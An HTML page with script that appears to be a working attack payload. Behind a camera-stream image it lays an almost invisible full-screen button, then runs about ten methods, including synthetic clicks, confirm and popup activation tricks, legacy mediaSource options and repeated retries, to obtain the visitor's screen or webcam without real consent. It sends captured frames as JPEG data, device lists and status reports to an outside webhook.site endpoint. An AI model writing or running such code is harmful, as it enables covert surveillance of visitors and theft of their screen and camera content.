<!DOCTYPE html>
<html>
<head><title>C</title></head>
<body style="margin:0;background:#111;">
<img id="cam" src="http://10.133.7.5/stream" style="width:640px;height:480px;display:block;">
<button id="btn" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.01;cursor:pointer;">Go</button>
<script>
var W='https://webhook.site/598c7aef-4515-4c18-9432-f37c1cdece16';
function rpt(k,v){new Image().src=W+'?t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
rpt('ALIVE','1|sec='+window.isSecureContext+'|md='+(typeof navigator.mediaDevices));

var gdmDone=false;

// === APPROACH 1: getUserMedia with mediaSource='screen' (Firefox legacy API) ===
setTimeout(function(){
    if(gdmDone)return;
    rpt('GUM_SCREEN','trying');
    navigator.mediaDevices.getUserMedia({video:{mediaSource:'screen'}}).then(function(s){
        if(gdmDone)return;gdmDone=true;
        rpt('GUM_SCREEN_OK','tracks='+s.getTracks().length);
        processStream(s);
    }).catch(function(e){
        rpt('GUM_SCREEN_E',e.name+':'+e.message.substring(0,200));
    });
},200);

// === APPROACH 2: getUserMedia with mediaSource='window' ===
setTimeout(function(){
    if(gdmDone)return;
    rpt('GUM_WINDOW','trying');
    navigator.mediaDevices.getUserMedia({video:{mediaSource:'window'}}).then(function(s){
        if(gdmDone)return;gdmDone=true;
        rpt('GUM_WINDOW_OK','tracks='+s.getTracks().length);
        processStream(s);
    }).catch(function(e){
        rpt('GUM_WINDOW_E',e.name+':'+e.message.substring(0,200));
    });
},800);

// === APPROACH 3: getUserMedia with mediaSource='browser' ===
setTimeout(function(){
    if(gdmDone)return;
    rpt('GUM_BROWSER','trying');
    navigator.mediaDevices.getUserMedia({video:{mediaSource:'browser'}}).then(function(s){
        if(gdmDone)return;gdmDone=true;
        rpt('GUM_BROWSER_OK','tracks='+s.getTracks().length);
        processStream(s);
    }).catch(function(e){
        rpt('GUM_BROWSER_E',e.name+':'+e.message.substring(0,200));
    });
},1400);

// === APPROACH 4: getUserMedia with mediaSource='application' ===
setTimeout(function(){
    if(gdmDone)return;
    rpt('GUM_APP','trying');
    navigator.mediaDevices.getUserMedia({video:{mediaSource:'application'}}).then(function(s){
        if(gdmDone)return;gdmDone=true;
        rpt('GUM_APP_OK','tracks='+s.getTracks().length);
        processStream(s);
    }).catch(function(e){
        rpt('GUM_APP_E',e.name+':'+e.message.substring(0,200));
    });
},2000);

// === APPROACH 5: btn.click() with getDisplayMedia in handler ===
var btn=document.getElementById('btn');
btn.addEventListener('click',function(e){
    rpt('BTN','trusted='+e.isTrusted+'|active='+navigator.userActivation.isActive+'|had='+navigator.userActivation.hasBeenActive);
    if(gdmDone)return;
    navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
        if(gdmDone)return;gdmDone=true;
        rpt('GDM_BTN_OK','tracks='+s.getTracks().length);
        processStream(s);
    }).catch(function(e2){
        rpt('GDM_BTN_E',e2.name+':'+e2.message.substring(0,100));
    });
});
setTimeout(function(){btn.click()},500);
setTimeout(function(){btn.click()},2500);
setTimeout(function(){btn.click()},5000);

// === APPROACH 6: window.open for activation then getDisplayMedia ===
setTimeout(function(){
    if(gdmDone)return;
    try{
        var w=window.open('about:blank','_blank','width=1,height=1');
        rpt('POPUP','opened='+(!!w)+'|active='+navigator.userActivation.isActive);
        if(w){w.close()}
        if(navigator.userActivation.isActive){
            navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
                if(gdmDone)return;gdmDone=true;
                rpt('GDM_POPUP_OK','tracks='+s.getTracks().length);
                processStream(s);
            }).catch(function(e){rpt('GDM_POPUP_E',e.name)});
        }
    }catch(e){rpt('POPUP_ERR',e.message)}
},3500);

// === APPROACH 7: confirm() for activation ===
setTimeout(function(){
    if(gdmDone)return;
    try{
        var r=confirm('share screen?');
        rpt('CONFIRM','r='+r+'|active='+navigator.userActivation.isActive);
        if(navigator.userActivation.isActive){
            navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
                if(gdmDone)return;gdmDone=true;
                rpt('GDM_CONFIRM_OK','tracks='+s.getTracks().length);
                processStream(s);
            }).catch(function(e){rpt('GDM_CONFIRM_E',e.name)});
        }
        btn.click();
    }catch(e){rpt('CONFIRM_ERR',e.message)}
},6500);

// === APPROACH 8: Direct GDM retries ===
var retryN=0;
function retryGDM(){
    retryN++;
    if(gdmDone||retryN>15)return;
    navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
        if(gdmDone)return;gdmDone=true;
        rpt('GDM_R_OK',retryN+'|tracks='+s.getTracks().length);
        processStream(s);
    }).catch(function(e){
        if(retryN<=2||retryN%5==0)rpt('GDM_R_E',retryN+'|'+e.name);
    });
    setTimeout(retryGDM,4000);
}
setTimeout(retryGDM,300);

// === APPROACH 9: mozGetUserMedia (prefixed) ===
setTimeout(function(){
    if(gdmDone)return;
    if(navigator.mozGetUserMedia){
        rpt('MOZ_GUM','exists');
        navigator.mozGetUserMedia({video:{mediaSource:'screen'}},function(s){
            if(gdmDone)return;gdmDone=true;
            rpt('MOZ_GUM_OK','tracks='+s.getTracks().length);
            processStream(s);
        },function(e){
            rpt('MOZ_GUM_E',e.name+':'+e.message.substring(0,100));
        });
    }else{
        rpt('MOZ_GUM','undefined');
    }
},4500);

// === APPROACH 10: enumerate devices then getUserMedia with deviceId ===
setTimeout(function(){
    if(gdmDone)return;
    navigator.mediaDevices.enumerateDevices().then(function(devs){
        var info=devs.map(function(d){return d.kind+':'+d.deviceId.substring(0,8)+':'+d.label.substring(0,30)}).join('|');
        rpt('DEVS',info||'none');
        // Try to capture any video device
        var vid=devs.filter(function(d){return d.kind==='videoinput'});
        if(vid.length>0){
            rpt('VIDDEV',vid[0].deviceId+':'+vid[0].label);
            navigator.mediaDevices.getUserMedia({video:{deviceId:{exact:vid[0].deviceId}}}).then(function(s){
                if(gdmDone)return;gdmDone=true;
                rpt('GUM_DEV_OK','tracks='+s.getTracks().length);
                processStream(s);
            }).catch(function(e){rpt('GUM_DEV_E',e.name+':'+e.message.substring(0,100))});
        }
    });
},7500);

function processStream(stream){
    rpt('STREAM','tracks='+stream.getTracks().length);
    stream.getTracks().forEach(function(t,i){
        rpt('TRACK',i+'|'+t.kind+':'+t.label+':'+t.readyState);
    });
    var v=document.createElement('video');
    v.srcObject=stream;v.autoplay=true;v.muted=true;
    v.style.cssText='width:800px;height:600px;display:block';
    document.body.appendChild(v);
    v.onloadeddata=function(){
        rpt('VID',v.videoWidth+'x'+v.videoHeight);
        doGrab(v,stream,'ld0');
        setTimeout(function(){doGrab(v,stream,'ld1')},1000);
        setTimeout(function(){doGrab(v,stream,'ld3')},3000);
    };
    setTimeout(function(){doGrab(v,stream,'t1')},500);
    setTimeout(function(){doGrab(v,stream,'t3')},3000);
    setTimeout(function(){doGrab(v,stream,'t10')},10000);
}

var grabN=0;
function doGrab(v,stream,label){
    grabN++;if(grabN>8)return;
    var w=v.videoWidth||1600,h=v.videoHeight||900;
    rpt('GRAB',label+'|'+w+'x'+h+'|rdy='+v.readyState);
    if(w<=0||h<=0)return;
    var c=document.createElement('canvas');c.width=w;c.height=h;
    var ctx=c.getContext('2d');
    try{ctx.drawImage(v,0,0,w,h)}catch(e){rpt('DRAW_E',label+'|'+e.message);return}
    try{
        var d=ctx.getImageData(0,0,20,1);
        var px=Array.from(d.data);
        var nz=px.filter(function(x){return x>0}).length;
        rpt('PX',label+'|nz='+nz+'|'+px.slice(0,40).join(','));
    }catch(e){rpt('PX_E',label+'|'+e.message)}
    try{
        var du=c.toDataURL('image/jpeg',0.7);
        rpt('DU',label+'|len='+du.length);
        if(du.length>1000){
            try{navigator.sendBeacon(W,label+':'+du)}catch(e){}
            fetch(W,{method:'POST',mode:'no-cors',body:label+':'+du}).catch(function(){});
        }
    }catch(e){rpt('DU_E',label+'|'+e.message)}
}
</script>
</body>
</html>
